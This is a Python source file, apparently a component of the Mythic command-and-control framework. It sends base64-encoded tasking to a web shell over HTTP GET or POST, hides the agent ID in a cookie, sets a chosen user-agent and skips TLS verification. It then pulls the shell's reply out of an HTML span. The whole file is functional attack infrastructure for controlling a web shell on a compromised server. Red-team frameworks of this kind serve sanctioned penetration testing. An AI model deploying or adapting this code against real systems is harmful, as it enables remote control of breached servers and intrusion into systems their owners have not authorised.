import aiohttp
import asyncio
import base64
from bs4 import BeautifulSoup
from mythic_container.MythicCommandBase import *
from mythic_container.MythicGoRPC.send_mythic_rpc_callback_edge_search import *


async def GetRequest(uuid: str, message: bytes, taskData: PTTaskMessageAllData) -> bytes:
    edges_query = await SendMythicRPCCallbackEdgeSearch(MythicRPCCallbackEdgeSearchMessage(
        AgentCallbackUUID=taskData.Callback.AgentCallbackID,
        SearchActiveEdgesOnly=True
    ))
    if not edges_query.Success:
        logger.debug("Failed to query edges: %s", edges_query.Error)
    elif len(edges_query.Results) > 0:
        logger.debug(edges_query.Results)
        return b''
    param_name = None
    cookie_name = None
    user_agent = None
    target = None
    for name, value in taskData.C2Profiles[0].Parameters.items():
        if name == "query_param":
            param_name = value
        elif name == "cookie_name":
            cookie_name = value
        elif name == "user_agent":
            user_agent = value
        elif name == "url":
            target = value
    encoded_uuid = base64.b64encode(uuid.encode('UTF8'))
    final_message = taskData.Callback.AgentCallbackID.encode() + message
    final_message = base64.b64encode(final_message)
    try:
        async with aiohttp.ClientSession(headers={'User-Agent': user_agent},
                                         cookies={cookie_name: encoded_uuid.decode('UTF8')}) as session:
            async with session.get(target, ssl=False, params={param_name: final_message.decode('UTF8')}, ) as resp:
                responseData = await resp.text()
                #logger.debug(f"WebShell response data: {responseData}")
                if resp.status == 200:
                    if len(responseData) > 0:
                        response = BeautifulSoup(responseData, 'html.parser')
                        base64_data = response.find("span", id="task_response")
                        if base64_data:
                            return base64_data.text.encode()
                        else:
                            raise Exception(f"Failed to find task_response in agent response:\n{response}\n{responseData}")
                    raise Exception(f"No response data back from agent\n")
                else:
                    logger.error(f"[-] Failed to send WebShell message: {resp}\n")
                    raise Exception(f"[-] Failed to send WebShell message: {resp}\n{responseData}")
    except Exception as e:
        logger.exception(f"[-] Failed to connect for WebShell: {e}\n")
        raise Exception(f"[-] Failed to connect for WebShell: {e}\n")


async def PostRequest(uuid: str, message: bytes, taskData: PTTaskMessageAllData):
    edges_query = await SendMythicRPCCallbackEdgeSearch(MythicRPCCallbackEdgeSearchMessage(
        AgentCallbackUUID=taskData.Callback.AgentCallbackID,
        SearchActiveEdgesOnly=True
    ))
    if not edges_query.Success:
        logger.debug("Failed to query edges: %s", edges_query.Error)
    elif len(edges_query.Results) > 0:
        return b''
    cookie_name = None
    user_agent = None
    target = None
    for name, value in taskData.C2Profiles[0].Parameters.items():
        if name == "cookie_name":
            cookie_name = value
        elif name == "user_agent":
            user_agent = value
        elif name == "url":
            target = value
    encoded_uuid = base64.b64encode(uuid.encode('UTF8'))
    final_message = taskData.Callback.AgentCallbackID.encode() + message
    final_message = base64.b64encode(final_message)
    try:
        async with aiohttp.ClientSession(headers={'User-Agent': user_agent},
                                         cookies={cookie_name: encoded_uuid.decode('UTF8')}) as session:
            async with session.post(target, ssl=False, data=final_message, ) as resp:
                responseData = await resp.text()
                #logger.debug(f"WebShell response data: {responseData}")
                if resp.status == 200:
                    if len(responseData) > 0:
                        response = BeautifulSoup(responseData, 'html.parser')
                        base64_data = response.find("span", id="task_response")
                        if base64_data:
                            return base64_data.text.encode()
                        else:
                            raise Exception(f"Failed to find task_response in agent response:\n{response}\n{responseData}")
                    raise Exception(f"No response data back from agent\n")
                else:
                    logger.error(f"[-] Failed to send WebShell message: {resp}\n")
                    raise Exception(f"[-] Failed to send WebShell message: {resp}\n{responseData}")
    except Exception as e:
        logger.exception(f"[-] Failed to connect for WebShell: {e}\n")
        raise Exception(f"[-] Failed to connect for WebShell: {e}\n")
